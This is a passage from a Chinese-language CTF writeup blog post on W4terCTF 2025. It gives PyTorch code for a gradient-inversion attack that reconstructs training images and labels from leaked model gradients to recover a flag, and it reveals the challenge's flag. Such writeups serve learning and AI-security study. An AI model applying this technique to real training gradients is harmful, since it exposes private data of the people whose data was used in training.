class="line"></span><br><span class="line"><span class="comment"># 3. 初始化 dummy 数据和标签</span></span><br><span class="line">dummy_data = torch.ones((<span class="number">1</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">32</span>), device=device, requires_grad=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 之前迭代损失很高就是因为没读懂提示，原来提示的作用是为了让初始化图像时尽可能接近恢复出的图像，这样就能降低损失。在比较少的迭代次数也能有效恢复。</span></span><br><span class="line"><span class="comment"># 图片背景是白色，初始化为全白图像，即采用 torch.ones。</span></span><br><span class="line"><span class="comment"># 之前一直模仿论文代码写的是 torch.rands，训练恢复的效果就很差。</span></span><br><span class="line">dummy_label = torch.randn((<span class="number">1</span>, <span class="number">100</span>), device=device, requires_grad=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 LBFGS 优化器</span></span><br><span class="line">optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">history = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 迭代优化以恢复图像和标签</span></span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        <span class="comment"># 进行前向传播获取预测结果</span></span><br><span class="line">        pred = net(dummy_data)</span><br><span class="line">        <span class="comment">#print(f&quot;Prediction shape: &#123;pred.shape&#125;&quot;)  # 打印预测结果的形状</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用 softmax 转换标签为概率分布</span></span><br><span class="line">        soft_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算交叉熵损失</span></span><br><span class="line">        loss = cross_entropy_for_onehot(pred, soft_label)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算损失对模型参数的梯度</span></span><br><span class="line">        grads = torch.autograd.grad(loss, net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算恢复梯度与原始梯度之间的差异</span></span><br><span class="line">        diff = <span class="built_in">sum</span>(((g_rec - g_orig) ** <span class="number">2</span>).<span class="built_in">sum</span>() <span class="keyword">for</span> g_rec, g_orig <span class="keyword">in</span> <span class="built_in">zip</span>(grads, origin_grad))</span><br><span class="line">        diff.backward()  <span class="comment"># 反向传播计算差异的梯度</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line">    optimizer.step(closure)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> it % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        loss_val = closure().item()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Iter <span class="subst">&#123;it:3d&#125;</span> | Loss: <span class="subst">&#123;loss_val:<span class="number">.4</span>f&#125;</span>&quot;</span>)</span><br><span class="line">        history.append(dummy_data[<span class="number">0</span>].detach().cpu())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 可视化中间恢复图像</span></span><br><span class="line">plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line"><span class="keyword">for</span> i, img <span class="keyword">in</span> <span class="built_in">enumerate</span>(history[:<span class="number">30</span>]):</span><br><span class="line">    plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">    plt.imshow(img.permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>).clip(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">    plt.title(<span class="string">f&quot;it=<span class="subst">&#123;i * <span class="number">10</span>&#125;</span>&quot;</span>)</span><br><span class="line">    plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">plt.tight_layout()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动命名图像文件</span></span><br><span class="line"><span class="keyword">if</span> args.out:</span><br><span class="line">    plt.savefig(args.out)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    grad_filename = os.path.splitext(os.path.basename(args.grad))[<span class="number">0</span>]  <span class="comment"># 提取不带扩展名的文件名</span></span><br><span class="line">    out_path = <span class="string">f&quot;<span class="subst">&#123;grad_filename&#125;</span>.png&quot;</span></span><br><span class="line">    plt.savefig(out_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Image saved to <span class="subst">&#123;out_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 输出恢复标签</span></span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    final_probs = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">    recovered_class = torch.argmax(final_probs, dim=-<span class="number">1</span>).item()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered class label:&quot;</span>, recovered_class)</span><br><span class="line"><span class="comment"># 这个标签有大用，之前看到输出结果一直以为是迭代过程中一个比较突出的数值，还是学得太粗略了。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># model.py</span></span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">R1ckNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, in_channels=<span class="number">3</span>, conv1_out=<span class="number">12</span>, conv2_out=<span class="number">12</span>, conv3_out=<span class="number">12</span>,</span></span><br><span class="line"><span class="params">                 conv4_out=<span class="number">16</span>, fc_in=<span class="number">1024</span>, num_classes=<span class="number">100</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.body = nn.Sequential(</span><br><span class="line">            nn.Conv2d(in_channels, conv1_out, <span class="number">5</span>, stride=<span class="number">2</span>, padding=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(conv1_out, conv2_out, <span class="number">5</span>, stride=<span class="number">2</span>, padding=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(conv2_out, conv3_out, <span class="number">5</span>, stride=<span class="number">1</span>, padding=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(conv3_out, conv4_out, <span class="number">3</span>, stride=<span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Flatten()</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.fc = nn.Linear(fc_in, num_classes)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = <span class="variable language_">self</span>.body(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>),-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 展平这一步很重要，规范张量的形状以和权重矩阵的形状相匹配。感觉自己学习代码还是挺粗线条的💦💦💦</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.fc(x)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># utils.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整数形式的分类标签转换为 One-Hot 编码。</span></span><br><span class="line"><span class="comment"># dummy_label是可导的，转换one-hot方便计算和预测结果之间的损失</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">label_to_onehot</span>(<span class="params">target, num_classes=<span class="number">100</span></span>):</span><br><span class="line">    target = torch.unsqueeze(target, <span class="number">1</span>)  <span class="comment"># [B,1]</span></span><br><span class="line">    onehot = torch.zeros(target.size(<span class="number">0</span>), num_classes, device=target.device)</span><br><span class="line">    onehot.scatter_(<span class="number">1</span>, target, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> onehot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算预测结果与 one-hot 标签之间的交叉熵损失。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cross_entropy_for_onehot</span>(<span class="params">pred, target</span>):</span><br><span class="line">    <span class="keyword">return</span> torch.mean(torch.<span class="built_in">sum</span>(- target * F.log_softmax(pred, dim=-<span class="number">1</span>), dim=<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># batch.py 批量训练梯度</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> R1ckNet</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> cross_entropy_for_onehot</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm  <span class="comment"># 用于显示进度条</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置参数</span></span><br><span class="line">GRAD_DIR = <span class="string">r&quot;E:\CTF\SYSUCTF\2025\misc\Gradient\attachments\gradient\grads_origin&quot;</span></span><br><span class="line">MODEL_PATH = <span class="string">r&quot;E:\CTF\SYSUCTF\2025\misc\Gradient\attachments\gradient\model.pth&quot;</span></span><br><span class="line">OUT_DIR = <span class="string">r&quot;E:\CTF\SYSUCTF\2025\misc\Gradient\attachments\gradient\outputs1&quot;</span></span><br><span class="line">os.makedirs(OUT_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设备选择</span></span><br><span class="line">device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Running on&quot;</span>, device)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载模型</span></span><br><span class="line">net = torch.load(MODEL_PATH, map_location=device,weights_only=<span class="literal">False</span>)</span><br><span class="line">net.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有 .grad 文件</span></span><br><span class="line"><span class="keyword">for</span> grad_file <span class="keyword">in</span> <span class="built_in">sorted</span>(os.listdir(GRAD_DIR)):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> grad_file.endswith(<span class="string">&quot;.grad&quot;</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    grad_path = os.path.join(GRAD_DIR, grad_file)</span><br><span class="line">    out_name = os.path.splitext(grad_file)[<span class="number">0</span>] + <span class="string">&quot;.png&quot;</span></span><br><span class="line">    out_path = os.path.join(OUT_DIR, out_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载原始梯度</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(grad_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        origin_grad = torch.load(f)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化 dummy 数据和标签</span></span><br><span class="line">    dummy_data = torch.ones((<span class="number">1</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">32</span>), device=device, requires_grad=<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn((<span class="number">1</span>, <span class="number">100</span>), device=device, requires_grad=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 迭代优化</span></span><br><span class="line">    <span class="keyword">for</span> it <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = net(dummy_data)</span><br><span class="line">            soft_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            loss = cross_entropy_for_onehot(pred, soft_label)</span><br><span class="line">            grads = torch.autograd.grad(loss, net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            diff = <span class="built_in">sum</span>(((g_rec - g_orig) ** <span class="number">2</span>).<span class="built_in">sum</span>() <span class="keyword">for</span> g_rec, g_orig <span class="keyword">in</span> <span class="built_in">zip</span>(grads, origin_grad))</span><br><span class="line">            diff.backward()</span><br><span class="line">            <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> it %<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            loss_val = closure().item()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Iter <span class="subst">&#123;it:3d&#125;</span> | Loss: <span class="subst">&#123;loss_val:<span class="number">.4</span>f&#125;</span>&quot;</span>)</span><br><span class="line">            history.append(dummy_data[<span class="number">0</span>].detach().cpu())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存图像</span></span><br><span class="line">    plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i, img <span class="keyword">in</span> <span class="built_in">enumerate</span>(history[:<span class="number">30</span>]):</span><br><span class="line">        plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(img.permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>).clip(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">        plt.title(<span class="string">f&quot;it=<span class="subst">&#123;i * <span class="number">10</span>&#125;</span>&quot;</span>)</span><br><span class="line">        plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    plt.tight_layout()</span><br><span class="line">    plt.savefig(out_path)</span><br><span class="line">    plt.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出标签（可选）</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        final_probs = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">        recovered_class = torch.argmax(final_probs, dim=-<span class="number">1</span>).item()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;grad_file&#125;</span> -&gt; Class: <span class="subst">&#123;recovered_class&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>然后就能预测图像了。</p>
<p>注意预测过程中，有些图像会因为迭代次数过大而“矫枉过正”，所以针对某些损失依旧很大的图像可以适当降低迭代次数，单独进行训练。</p>
<p><img src="/2025/05/13/W4terCTF-2025/image-20250504223254918.png" alt="image-20250504223254918"></p>
<p>最后恢复出了的图像如下：</p>
<p><img src="3.png" alt="3" style="zoom:25%;" /><img src="1.png" alt="1" style="zoom:25%;" /><img src="2.png" alt="2" style="zoom:25%;" /></p>
<p><img src="31.png" alt="31" style="zoom:25%;" /><img src="32.png" alt="32" style="zoom:25%;" /><img src="4.png" alt="4" style="zoom:25%;" /></p>
<p><img src="5.png" alt="5" style="zoom:25%;" /><img src="6.png" alt="6" style="zoom:25%;" /><img src="7.png" alt="7" style="zoom:25%;" /></p>
<p><img src="8.png" alt="8" style="zoom:25%;" /><img src="9.png" alt="9" style="zoom:25%;" /><img src="10.png" alt="10" style="zoom:25%;" /></p>
<p><img src="11.png" alt="11" style="zoom:25%;" /><img src="12.png" alt="12" style="zoom:25%;" /><img src="13.png" alt="13" style="zoom:25%;" /></p>
<p><img src="14.png" alt="14" style="zoom:25%;" /><img src="15.png" alt="15" style="zoom:25%;" /><img src="16.png" alt="16" style="zoom:25%;" /></p>
<p><img src="17.png" alt="17" style="zoom:25%;" /><img src="18.png" alt="18" style="zoom:25%;" /><img src="19.png" alt="19" style="zoom:25%;" /></p>
<p><img src="20.png" alt="20" style="zoom:25%;" /><img src="21.png" alt="21" style="zoom:25%;" /><img src="22.png" alt="22" style="zoom:25%;" /></p>
<p><img src="23.png" alt="23" style="zoom:25%;" /><img src="24.png" alt="24" style="zoom:25%;" /><img src="25.png" alt="25" style="zoom:25%;" /></p>
<p><img src="26.png" alt="26" style="zoom:25%;" /><img src="27.png" alt="27" style="zoom:25%;" /><img src="28.png" alt="28" style="zoom:25%;" /></p>
<p><img src="29.png" alt="29" style="zoom:25%;" /><img src="30.png" alt="30" style="zoom:25%;" /></p>
<p>数据处理的比较乱。。。</p>
<p>恢复出来发现并不是顺序可读的flag。</p>
<p>想到了用时间判断梯度生成的先后，结果发现精确到毫秒级所有样本都是一模一样的。然后问ai说可以通过损失判断训练的先后，因为损失一般是收敛的，但并没有观察出什么规律。又莫名其妙发现.grad可以解压，有个serialization_id，还以为和梯度顺序有关，但其实只是训练设备的标号。最后才知道顺序和标签有关——</p>
<p>（又重新训了一遍数据看标签的值）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 6. 输出恢复标签</span></span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    final_probs = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">    recovered_class = torch.argmax(final_probs, dim=-<span class="number">1</span>).item()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered class label:&quot;</span>, recovered_class)</span><br></pre></td></tr></table></figure>

<p>这个标签代表了梯度的顺序。</p>
<p>需要注意的是，如果迭代时损失比较大，可能就不能使标签收敛到正确的值。所以也需要再调整迭代次数重新训练。</p>
<p>因为数据处理的比较乱，则列了一个表格记录标签值</p>
<p><img src="/2025/05/13/W4terCTF-2025/image-20250504224517508.png" alt="image-20250504224517508"></p>
<p>最后一个样本在恢复标签值时始终找不到合适的迭代次数，但好在通过标签值排序后已经恢复出了flag的大意：R1ck likes ai security，所以便没有重新训练该样本。</p>
<p>历经千辛万苦得到了flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: W4terCTF&#123;R1ck_iik35_41_53cur17y&#125;</span><br></pre></td></tr></table></figure>

<p>虽然课没好好上，但是通过这次ai安全的题目感觉把之前欠的都补回来了。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>在比赛中的成长只有靠写WP才能沉淀。但是太拖延了几乎比完赛才开始动笔写。</p>
<p>虽然只能做做简单题，但是能坚持在五一打比赛已经很了不起了😭😭👍</p>
<p>相比去年只做出一道题，今年进步也算不小了，虽然有不少的功劳出自ai和出题人。（出题人们真的好强，真是学到了不少东西）</p>
<p>感谢队友的鼎力相助，看到队友能挑战pwn题和hard题——仰慕.jpg</p>
<p>比赛过的很快，五一也过得很快。是时候该补作业了。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>压线过二等。</p>
<p><img src="/2025/05/13/W4terCTF-2025/list.png" alt="alt text"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://pomni.fun/2025/05/13/W4terCTF-2025/" data-id="cmatez4rs0006fm7o8m36feah" data-title="W4terCTF 2025" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2025/05/14/Github-Action-deployment/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Github Action deployment
        
      </div>
    </a>
  
  
    <a href="/2025/03/30/BUUCTF-reverse/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">BUUCTF reverse</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/summary/" rel="tag">summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tech/" rel="tag">tech</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/summary/" style="font-size: 10px;">summary</a> <a href="/tags/tech/" style="font-size: 10px;">tech</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">March 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/05/18/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/">博客搭建的一些反思</a>
          </li>
        
          <li>
            <a href="/2025/05/14/Github-Action-deployment/">Github Action deployment</a>
          </li>
        
          <li>
            <a href="/2025/05/13/W4terCTF-2025/">W4terCTF 2025</a>
          </li>
        
          <li>
            <a href="/2025/03/30/BUUCTF-reverse/">BUUCTF reverse</a>
          </li>
        
          <li>
            <a href="/2025/03/07/A-new-journey/">A new journey</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 Pomni<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>